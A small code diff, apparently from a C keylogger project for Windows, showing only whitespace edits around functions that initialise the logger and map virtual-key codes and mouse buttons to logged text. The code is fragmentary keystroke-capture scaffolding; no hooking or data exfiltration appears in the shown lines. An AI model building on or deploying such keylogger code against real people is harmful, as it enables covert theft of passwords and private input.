@@ -9,7 +9,6 @@ static char getKeyChar(KEY_LOGGER* kLogger, KEY_PAIR* kp, LPDWORD vkCode);
 static ERR_CODE writeStrToBuffer(KEY_LOGGER* kLogger, char* s);
 static void createKeyPairs(KEY_LOGGER* kLogger);
 
-
 KEY_LOGGER* initKeyLogger() {
     KEY_LOGGER* kLogger = malloc(sizeof(KEY_LOGGER));
     if (kLogger == NULL) { return NULL; }
@@ -157,7 +156,7 @@ static void createKeyPairs(KEY_LOGGER* kLogger) {
         char lowerLetter = upperLetter + 0x20; // get lowercase
         kLogger->keyCodes[upperLetter] = initKeyPair(lowerLetter, upperLetter, NULL);
     }
-
+    
     kLogger->keyCodes[VK_LBUTTON]  = initKeyPair('\0', '\0', "[LMOUSE]");
     kLogger->keyCodes[VK_RBUTTON]  = initKeyPair('\0', '\0', "[RMOUSE]");
     kLogger->keyCodes[VK_BACK]     = initKeyPair('\0', '\0', "[BACKSPACE]");
